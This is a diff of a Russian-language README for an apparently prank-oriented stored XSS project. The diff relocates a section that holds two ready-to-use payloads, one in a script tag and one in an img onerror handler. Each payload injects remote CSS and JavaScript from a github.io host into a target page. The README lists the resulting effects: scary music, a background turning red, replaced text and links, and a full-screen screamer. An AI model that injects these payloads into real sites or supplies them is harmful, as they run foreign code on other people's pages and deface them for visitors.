@@ -5,14 +5,6 @@
 
 https://github.com/0-DAyFF13R/Stored-XSS-scary/assets/63510648/bb422629-d35f-476e-841e-461b51f6bd0e
 
-------------------------------------------
-
-Полная версия (JS + CSS) [288 символов]:
-<br><br>Через тег "script"
-<br>```<script>var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r);</script>```
-<br><br>Через тег "img"
-<br>```<img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)">```
-
 * Страшная музыка.
 * Постепенно изменяющийся цвет фона на красный.
 * Прыгающий и мигающий текст.
@@ -21,3 +13,11 @@ https://github.com/0-DAyFF13R/Stored-XSS-scary/assets/63510648/bb422629-d35f-476
 * Замена текста из тегов "p", "h1", "a".
 * Замена всех тегов "a" на "p".
 * Скример на весь экран с криком в течение какого-то времени.
+
+------------------------------------------
+
+Полная версия (JS + CSS) [288 символов]:
+<br><br>Через тег "script"
+<br>```<script>var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r);</script>```
+<br><br>Через тег "img"
+<br>```<img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)">```
